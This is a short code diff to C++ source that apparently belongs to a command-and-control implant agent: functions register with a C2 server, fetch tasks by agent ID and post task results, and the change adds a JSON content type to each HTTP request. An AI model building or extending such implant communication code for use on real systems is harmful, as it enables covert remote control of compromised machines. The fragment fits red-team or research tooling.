@@ -18,13 +18,13 @@ namespace communication {
         NetApiBufferFree(pInfo); // Free the allocated memory
 
         std::string json_data = j.dump();
-        std::wstring response = network::MakeHttpRequest(c2_host, L"/register", json_data, L"POST");
+        std::wstring response = network::MakeHttpRequest(c2_host, L"/register", json_data, L"POST", L"application/json");
         return misc::WStringToJson(response);
     }
 
     nlohmann::json FetchTask(const std::wstring& c2_host, const std::wstring& agent_id) {
         std::wstring path = L"/" + agent_id + L"/tasks";
-        std::wstring response = network::MakeHttpRequest(c2_host, path, "", L"GET");
+        std::wstring response = network::MakeHttpRequest(c2_host, path, "", L"GET", L"application/json");
         return misc::WStringToJson(response);
     }
 
@@ -32,7 +32,7 @@ namespace communication {
         const nlohmann::json& task_result) {
         std::wstring path = L"/" + agent_id + L"/results";
         std::string json_data = task_result.dump();
-        std::wstring response = network::MakeHttpRequest(c2_host, path, json_data, L"POST");
+        std::wstring response = network::MakeHttpRequest(c2_host, path, json_data, L"POST", L"application/json");
         return !response.empty();
     }
 }
